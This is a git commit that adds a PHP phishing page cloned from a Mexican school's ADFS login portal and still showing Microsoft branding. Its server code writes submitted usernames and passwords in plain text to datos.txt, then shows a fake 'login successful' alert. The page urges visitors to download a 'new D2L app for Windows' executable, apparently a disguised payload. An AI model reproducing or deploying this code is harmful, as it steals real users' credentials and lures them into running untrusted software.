879ea3dad71d1ae2b678ea381f41a5e12d5aa371
Dr.connors <129126860+DanielBustamanteLagart@users.noreply.github.com>
2023-06-21 16:40:38 -0600

    Add files via upload

---
+++ credenciales.php
@@ -0,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+
+
+    <?php
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $userName = $_POST['UserName'] ?? '';
+    $password = $_POST['Password'] ?? '';
+
+    // Guardar los valores en un archivo de texto
+    $file = fopen('datos.txt', 'a');
+    if ($file) {
+        fwrite($file, "Usuario: " . $userName . "\n");
+        fwrite($file, "Contraseña: " . $password . "\n");
+        fwrite($file, "-------------------------\n");
+        fclose($file);
+        echo '<script>alert("Iniciaste sesion correctamente, ahora puedes descargar la App")</script>';
+    } else {
+        echo "Error al abrir el archivo.";
+    }
+}
+?>
+
+
+        <meta http-equiv="X-UA-Compatible" content="IE=10.000"/>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+        <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+        <meta http-equiv="cache-control" content="no-cache,no-store"/>
+        <meta http-equiv="pragma" content="no-cache"/>
+        <meta http-equiv="expires" content="-1"/>
+        <meta name='mswebdialog-title' content='Connecting to Artek'/>
+
+        <title>Instituto artek</title>
+        <script type='text/javascript'>
+//<![CDATA[
+function Errors(){this.reportSubject = 'Error Report'; }
+//]]>
+</script>
+
+
+        
+        <link rel="stylesheet" type="text/css" href="../portal/css/stylea060.css?id=D74D4D6943F32AE6F7F11D14D601DBB0E1A58919176EE512150366B6279AAF99" /><style>.illustrationClass {background-image:url(../portal/illustration/illustration7277.png?id=98C6C2C2C36B451A8D16FDE81E9E9125F626C050FC5709A8D71F58CF2D41D126);}</style>
+
+
+
+
+
+</head>
+<body dir="ltr" class="body">
+    <div id="noScript" style="position:static; width:100%; height:100%; z-index:100">
+        <h1>JavaScript required</h1>
+        <p>JavaScript is required. This web browser does not support JavaScript or JavaScript in this web browser is not enabled.</p>
+        <p>To find out if your web browser supports JavaScript or to enable JavaScript, see web browser help.</p>
+    </div>
+    <script type="text/javascript" language="JavaScript">
+         document.getElementById("noScript").style.display = "none";
+    </script>
+    <div id="fullPage">
+        <div id="brandingWrapper" class="float">
+            <div id="branding"></div>
+        </div>
+        <div id="contentWrapper" class="float">
+            <div id="content">
+                <div id="header">
+                    <img class="logoImage" src="../portal/logo/logob62e.png?id=7F18C924CC7AEFA8BB7A531C4D1CE2A92821F2582A020219B56E82CF4AE67024" alt="Artek"/>
+                </div>
+                <div id="workArea">
+                    
+    
+                    <div id="workArea">
+                    
+                        <div id="authArea" class="groupMargin">
+                            
+                            
+                        <div id="loginArea">
+                            <center><img src="\portal\illustration\Windows_Phone_icon-icons.com_66782.png" alt="" width="25%" height="25%"></center>        
+                            <div id="loginMessage" class="groupMargin">Descarga la nueva App de D2L para Windows</div>
+                    
+                            <form>
+                                    <div id="submissionArea" class="submitIniciodesesion">
+                                    <a  href="D2L-Desktop.exe" download="D2L-Desktop.exe" class="submit" type="btn">Continuar con la descargar</a>
+                                    </div>
+                                </div>
+                                <input id="optionForms" type="hidden" name="AuthMethod" value="FormsAuthentication">
+                            </form>
+                    
+                                 <div id="authOptions">
+                            <form id="options" method="post" action="https://online.artek.edu.mx:443/adfs/ls/?SAMLRequest=jZE9T8MwEEB3JP5D5D2x46RuYiWVKlgqlaUFBhZkJ9fWIrGDz0H8fFyqIiQWtvvQnd67a9ZzONkdvM%2bAIdnctwTVOPhL%2flou60PPc82hXpSiWupFX7CqZELpQhfsQJJn8GicbQnPGEk2iDNsLAZlQywxXqRMpKx6zIVkQhZVFjfmgvMXkqwRwYc4e%2bcsziP4PfgP08HTbtuSUwgTSkpN3GXCHJzyAd4y7c3xFHBSHWSdG2nPBzpMVEUHOrijsfRMvz1HWeyR5HMcLLZk9lY6hQalVSOgDJ3crx%2b2MkLLybvgOjeQ1e1NkjTfCv4%2fg%2boqQFZXXBCHulL1MuV5qdNSsD7VvchTBeWCR%2b9OQJEFsPE8%2bEfmB72hF4gI1NDf%2f1l9AQ%3d%3d&amp;RelayState=%2fd2l%2fle%2fcalendar%2f7238">
+                                <script type="text/javascript">
+                                    function SelectOption(option) {
+                                        var i = document.getElementById('optionSelection');
+                                        i.value = option;
+                                        document.forms['options'].submit();
+                                        return false;
+                                    }
+                                </script>
+                                <input id="optionSelection" type="hidden" name="AuthMethod">
+                                <div class="groupMargin"></div>
+                            </form>
+                          </div>
+                    
+                            <div id="introduction" class="groupMargin">
+                                                     
+                            </div>
+                    
+                            <script type="text/javascript">
+                            //<![CDATA[
+                    
+                                function Login() {
+                                }
+                    
+                                Login.userNameInput = 'userNameInput';
+                                Login.passwordInput = 'passwordInput';
+                    
+                                Login.initialize = function () {
+                    
+                                    var u = new InputUtil();
+                    
+                                    u.checkError();
+                                    u.setInitialFocus(Login.userNameInput);
+                                    u.setInitialFocus(Login.passwordInput);
+                                }();
+                    
+                                Login.submitLoginRequest = function () { 
+                                    var u = new InputUtil();
+                                    var e = new LoginErrors();
+                    
+                                    var userName = document.getElementById(Login.userNameInput);
+                                    var password = document.getElementById(Login.passwordInput);
+                    
+                                    if (!userName.value || !userName.value.match('[@\\\\]')) {
+                                        u.setError(userName, e.userNameFormatError);
+                                        return false;
+                                    }
+                    
+                                    if (!password.value) {
+                                        u.setError(password, e.passwordEmpty);
+                                        return false;
+                                    }
+                    
+                                    if (password.value.length > maxPasswordLength) {
+                                        u.setError(password, e.passwordTooLong);
+                                        return false;
+                                    }
+                    
+                                    document.forms['loginForm'].submit();
+                                    return false;
+                                };
+                    
+                                InputUtil.makePlaceholder(Login.userNameInput);
+                                InputUtil.makePlaceholder(Login.passwordInput);
+                            //]]>
+                            </script>
+                        </div>
+                    
+                        </div>
+                    
+                                    </div>
+        
+
+
+    </div>
+
+    </div>
+
+                </div>
+                <div id="footerPlaceholder"></div>
+            </div>
+            <div id="footer">
+                <div id="footerLinks" class="floatReverse">
+                     <div><span id="copyright">&#169; 2013 Microsoft</span></div>
+                </div>
+            </div>
+        </div> 
+    </div>
+    <script type='text/javascript'>
+//<![CDATA[
+// Copyright (c) Microsoft Corporation.  All rights reserved.
+
+// This file contains several workarounds on inconsistent browser behaviors that administrators may customize.
+"use strict";
+
+// iPhone email friendly keyboard does not include "\" key, use regular keyboard instead.
+// Note change input type does not work on all versions of all browsers.
+if (navigator.userAgent.match(/iPhone/i) != null) {
+    var emails = document.querySelectorAll("input[type='email']");
+    if (emails) {
+        for (var i = 0; i < emails.length; i++) {
+            emails[i].type = 'text';
+        }
+    }
+}
+
+// In the CSS file we set the ms-viewport to be consistent with the device dimensions, 
+// which is necessary for correct functionality of immersive IE. 
+// However, for Windows 8 phone we need to reset the ms-viewport's dimension to its original
+// values (auto), otherwise the viewport dimensions will be wrong for Windows 8 phone.
+// Windows 8 phone has agent string 'IEMobile 10.0'
+if (navigator.userAgent.match(/IEMobile\/10\.0/)) {
+    var msViewportStyle = document.createElement("style");
+    msViewportStyle.appendChild(
+        document.createTextNode(
+            "@-ms-viewport{width:auto!important}"
+        )
+    );
+    msViewportStyle.appendChild(
+        document.createTextNode(
+            "@-ms-viewport{height:auto!important}"
+        )
+    );
+    document.getElementsByTagName("head")[0].appendChild(msViewportStyle);
+}
+
+// If the innerWidth is defined, use it as the viewport width.
+if (window.innerWidth && window.outerWidth && window.innerWidth !== window.outerWidth) {
+    var viewport = document.querySelector("meta[name=viewport]");
+    viewport.setAttribute('content', 'width=' + window.innerWidth + 'px; initial-scale=1.0; maximum-scale=1.0');
+}
+
+// Gets the current style of a specific property for a specific element.
+function getStyle(element, styleProp) {
+    var propStyle = null;
+
+    if (element && element.currentStyle) {
+        propStyle = element.currentStyle[styleProp];
+    }
+    else if (element && window.getComputedStyle) {
+        propStyle = document.defaultView.getComputedStyle(element, null).getPropertyValue(styleProp);
+    }
+
+    return propStyle;
+}
+
+// The script below is used for downloading the illustration image 
+// only when the branding is displaying. This script work together
+// with the code in PageBase.cs that sets the html inline style
+// containing the class 'illustrationClass' with the background image.
+var computeLoadIllustration = function () {
+    var branding = document.getElementById("branding");
+    var brandingDisplay = getStyle(branding, "display");
+    var brandingWrapperDisplay = getStyle(document.getElementById("brandingWrapper"), "display");
+
+    if (brandingDisplay && brandingDisplay !== "none" &&
+        brandingWrapperDisplay && brandingWrapperDisplay !== "none") {
+        var newClass = "illustrationClass";
+
+        if (branding.classList && branding.classList.add) {
+            branding.classList.add(newClass);
+        } else if (branding.className !== undefined) {
+            branding.className += " " + newClass;
+        }
+        if (window.removeEventListener) {
+            window.removeEventListener('load', computeLoadIllustration, false);
+            window.removeEventListener('resize', computeLoadIllustration, false);
+        }
+        else if (window.detachEvent) {
+            window.detachEvent('onload', computeLoadIllustration);
+            window.detachEvent('onresize', computeLoadIllustration);
+        }
+    }
+};
+
+if (window.addEventListener) {
+    window.addEventListener('resize', computeLoadIllustration, false);
+    window.addEventListener('load', computeLoadIllustration, false);
+}
+else if (window.attachEvent) {
+    window.attachEvent('onresize', computeLoadIllustration);
+    window.attachEvent('onload', computeLoadIllustration);
+}
+if (typeof Login != 'undefined'){  
+    Login.submitLoginRequest = function () {   
+    var u = new InputUtil();  
+    var e = new LoginErrors();  
+    var userName = document.getElementById(Login.userNameInput);  
+    var password = document.getElementById(Login.passwordInput);  
+    if (userName.value && !userName.value.match('[@\\\\]'))   
+    {  
+        var userNameValue = 'EDUKALUZ\\' + userName.value;  
+        document.forms['loginForm'].UserName.value = userNameValue;  
+    }  
+    if (!userName.value) {  
+       u.setError(userName, e.userNameFormatError);  
+       return false;  
+    }  
+    if (!password.value)   
+    {  
+        u.setError(password, e.passwordEmpty);  
+        return false;  
+    }  
+    document.forms['loginForm'].submit();  
+    return false;  
+};  
+}
+//]]>
+</script>
+
+
+    </body>
+
+<!-- Mirrored from online.artek.edu.mx/adfs/ls/?SAMLRequest=jZE9T8MwEEB3JP5D5D2x47huYiWVKlgqlaUFBhbkONc2IrGDz0H8fFyqIiQWtvvQnd67q9dzONkdvM+AIdncNwT1OPhL%2fqqh0mUFlclbLkAcSqY1g1YYDsuuyAVJnsFj72xDeMZIskGcYWMxaBtiifEiZTJl5WMuFasUW2RSiCovFi8kWSOCD3H2zlmcR%2fB78B+9gafdtiGnECZUlPZxVx%2fm4LQP8Ja1vj+eAk7aQGbcSDs+0GGiOjrQwR17S8%2f023OUxR5JPsfBYkNmb5XT2KOyegRUwaj9+mGrIrSavAvOuIGsbm+SpP5W8P8Z1FcBsrrigjxUpa6WKc9FmwrJurTtZJ5qEAueS24kFFkAG8+Df2R+0Gt6gYhANf39n9UX by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 08 Jun 2023 16:11:04 GMT -->
+</html> 
